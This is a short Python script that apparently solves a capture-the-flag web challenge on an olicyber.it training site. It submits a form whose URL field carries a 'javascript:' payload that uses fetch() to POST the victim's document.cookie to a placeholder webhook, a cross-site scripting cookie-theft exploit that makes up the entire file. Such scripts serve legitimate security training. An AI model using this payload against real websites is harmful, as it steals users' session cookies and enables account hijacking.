import requests 

site = 'http://proposte.challs.olicyber.it/'

s = requests.Session()

payload = "javascript:fetch('YOUR WEBHOOK HERE', {method: 'POST',body:document.cookie});"
s.post(site+'altro', data ={"text":"zaza","url":f"{payload}"})

# CHECK YOUR WEBHOOK
